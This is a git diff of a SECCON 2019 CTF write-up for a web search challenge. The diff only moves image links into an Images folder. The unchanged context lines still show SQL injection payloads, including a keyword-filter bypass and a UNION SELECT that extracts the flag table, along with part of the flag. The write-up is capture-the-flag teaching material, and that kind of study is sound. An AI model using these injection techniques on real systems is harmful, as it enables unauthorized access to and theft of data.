@@ -11,7 +11,7 @@ http://web-search.chal.seccon.jp/
 ## Content
 
 In this challenge, our payload will merged into SQL string, executed, and output will printed in main page.
-![Main page](https://github.com/sumango3/ctf/blob/master/2019-SECCON-CTF/web_search.png)
+![Main page](https://github.com/sumango3/ctf/blob/master/Images/2019-SECCON-CTF/web_search.png)
 By testing with some words, we may assume that SQL may look like following:
 ```
 SELECT * from $table_name WHERE $column1 LIKE "RFC%" and $column2 LIKE '$q' LIMIT ($page*50, ($page+1)*50);
@@ -29,7 +29,7 @@ In result, the payload will be following:
 '/**/oorr/**/true#
 ```
 And this will give us a new row.
-![Stage 1](https://github.com/sumango3/ctf/blob/master/2019-SECCON-CTF/web_search_1.png)
+![Stage 1](https://github.com/sumango3/ctf/blob/master/Images/2019-SECCON-CTF/web_search_1.png)
 
 ```
 FLAG
@@ -77,7 +77,7 @@ Next guess was 3 column RFC table and 1 column flag table.
 '/**/UNION/**/SELECT/**/*/**/FROM/**/(SELECT/**/*/**/FROM/**/flag)a/**/JOIN/**/(SELECT/**/2)b/**/JOIN/**/(SELECT/**/3)c#
 ```
 and this will give us
-![Stage 2](https://github.com/sumango3/ctf/blob/master/2019-SECCON-CTF/web_search_2.png)
+![Stage 2](https://github.com/sumango3/ctf/blob/master/Images/2019-SECCON-CTF/web_search_2.png)
 ```
 You_Win_Yeah}
     2
